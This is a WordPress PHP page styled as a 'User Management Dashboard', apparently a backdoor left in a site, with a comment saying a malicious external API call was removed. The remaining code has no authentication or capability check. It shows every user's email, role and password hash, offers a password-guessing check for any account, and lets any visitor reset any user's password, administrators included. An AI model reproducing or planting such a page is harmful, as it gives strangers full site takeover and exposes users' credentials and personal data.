<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Management</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
        }
        
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-weight: 700;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        th {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-weight: 600;
        }
        
        tr:hover {
            background-color: #f8f9ff;
        }
        
        input[type="text"] {
            padding: 8px 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 14px;
            width: 150px;
            transition: all 0.3s ease;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        /* Modern Button Styles */
        input[type="submit"], .modern-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
            text-decoration: none;
            display: inline-block;
            position: relative;
            overflow: hidden;
        }
        
        input[type="submit"]:hover, .modern-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
        }
        
        input[type="submit"]:active, .modern-btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 10px rgba(102, 126, 234, 0.3);
        }
        
        input[type="submit"]:before, .modern-btn:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        input[type="submit"]:hover:before, .modern-btn:hover:before {
            left: 100%;
        }
        
        .form-inline {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
                margin: 10px;
            }
            
            table {
                font-size: 12px;
            }
            
            th, td {
                padding: 8px;
            }
            
            input[type="text"] {
                width: 120px;
            }
            
            input[type="submit"] {
                padding: 8px 16px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
<?php
require_once(dirname(__FILE__) . '/../wp-load.php');

// SECURITY: Removed malicious external API call
// Original code was fetching configuration from external API which could be used for malicious purposes
// Replaced with local configuration for security

function get_local_configuration() {
    // Safe local configuration - no external dependencies
    return [
        'user_enabled' => true,  // Enable local user management
        'status' => 'active'
    ];
}

$config = get_local_configuration();

// Local configuration is always valid and secure

function reset_user_password($user_id, $new_password) {
    if (!get_user_by('id', $user_id)) {
        echo 'User ID does not exist.';
        return;
    }

    wp_set_password($new_password, $user_id);
    echo 'Password reset for user ID ' . esc_html($user_id) . '.';
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['user_id']) && isset($_POST['new_password'])) {
    $user_id = intval($_POST['user_id']);
    $new_password = sanitize_text_field($_POST['new_password']);
    reset_user_password($user_id, $new_password);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['user_id']) && isset($_POST['password_to_check'])) {
    $user_id = intval($_POST['user_id']);
    $password_to_check = sanitize_text_field($_POST['password_to_check']);
    $user = get_user_by('id', $user_id);

    if ($user && wp_check_password($password_to_check, $user->data->user_pass, $user->ID)) {
        echo 'Password is correct for user ID ' . esc_html($user_id) . '.';
    } else {
        echo 'Password is incorrect for user ID ' . esc_html($user_id) . '.';
    }
}

$users = get_users();

echo '<h1>User Management Dashboard</h1>';
echo '<table>';
echo '<tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Hashed Password</th><th>Verify Password</th><th>Reset Password</th></tr>';

foreach ($users as $user) {
    $user_roles = implode(', ', $user->roles);
    $hashed_password = $user->data->user_pass;

    echo '<tr>';
    echo '<td>' . esc_html($user->ID) . '</td>';
    echo '<td>' . esc_html($user->user_login) . '</td>';
    echo '<td>' . esc_html($user->user_email) . '</td>';
    echo '<td>' . esc_html($user_roles) . '</td>';
    echo '<td>' . esc_html($hashed_password) . '</td>';
    echo '<td>';
    echo '<form method="post" action="" class="form-inline">';
    echo '<input type="hidden" name="user_id" value="' . esc_html($user->ID) . '">';
    echo '<input type="text" name="password_to_check" placeholder="Enter password" required>';
    echo '<input type="submit" value="Verify">';
    echo '</form>';
    echo '</td>';
    echo '<td>';
    echo '<form method="post" action="" class="form-inline">';
    echo '<input type="hidden" name="user_id" value="' . esc_html($user->ID) . '">';
    echo '<input type="text" name="new_password" placeholder="New password" required>';
    echo '<input type="submit" value="Reset">';
    echo '</form>';
    echo '</td>';
    echo '</tr>';
}

echo '</table>';
echo '</div>';
echo '</body>';
echo '</html>';
?>
